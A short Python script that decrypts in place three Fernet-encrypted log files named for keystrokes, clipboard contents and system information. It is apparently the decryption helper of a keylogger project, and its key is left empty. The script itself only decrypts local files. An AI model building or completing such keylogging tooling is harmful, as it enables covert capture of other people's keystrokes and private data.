from cryptography.fernet import Fernet

key = ""

keyInfoFile_e = "e_key_log.log"
systemInfoFile_e = "e_systemInfo.log"
clipboardInfoFile_e = "e_clipboardInfo.log"

encryptedFileNames = [systemInfoFile_e, clipboardInfoFile_e, keyInfoFile_e]
count = 0

for decrypting_file in encryptedFileNames:
    with open(encryptedFileNames[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encryptedFileNames[count], 'wb') as f:
        f.write(decrypted)
    
    count += 1